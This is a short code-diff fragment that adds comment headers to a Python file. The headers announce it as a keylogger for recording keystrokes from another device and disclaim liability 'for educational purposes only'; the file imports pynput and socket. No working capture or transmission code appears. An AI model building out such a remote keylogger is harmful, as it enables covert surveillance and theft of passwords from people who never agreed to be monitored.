@@ -1,3 +1,6 @@
+# Keylogger to Record Keystrokes from a different Device 
+# I assume no liability for damages it is for educational purposes only 
+
 import pynput
 from pynput import keyboard
 import socket
